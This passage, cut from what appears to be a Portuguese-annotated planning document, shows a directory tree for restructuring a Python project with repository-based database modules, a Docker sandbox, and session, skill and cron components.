    loader.py            # Banco + file config
    server_config.py     # NOVO
  cron/
    service.py           # Via Repository
    types.py             # (sem mudanca)
  db/                    # NOVO
    repositories.py      # Protocols (interfaces)
    factory.py           # RepositoryFactory
    sqlite/
      connection.py
      migrations.py
      user_repo.py
      session_repo.py
      memory_repo.py
      skill_repo.py
      cron_repo.py
      channel_binding_repo.py
      audit_repo.py
    mongo/               # FUTURO
      ...
  sandbox/               # NOVO (fase 3)
    manager.py
    container.py
    Dockerfile
  providers/             # (sem mudanca)
  session/
    manager.py           # Via Repository
  skills/                # Builtins (sem mudanca)
  templates/             # (sem mudanca)
  utils/
    helpers.py           # Manter helpers uteis
```
